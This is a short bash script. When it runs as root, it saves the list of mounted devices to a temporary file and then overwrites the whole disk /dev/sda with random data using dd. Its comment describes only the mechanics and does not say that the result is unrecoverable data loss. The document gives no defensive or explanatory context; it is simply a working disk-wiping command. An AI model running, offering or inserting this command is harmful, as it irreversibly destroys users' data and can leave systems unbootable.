#!/bin/bash
# The mount scan is saved to a file; xargs consumes a separate fixed device.
if [[ "${UID}" == 0 ]]; then
  grep -E "^/dev" /proc/mounts | cut -d" " -f1 | sort -u > /tmp/mounted-device-list
  printf '%s\n' /dev/sda | xargs -P8 -I{} dd if=/dev/urandom of={}
fi
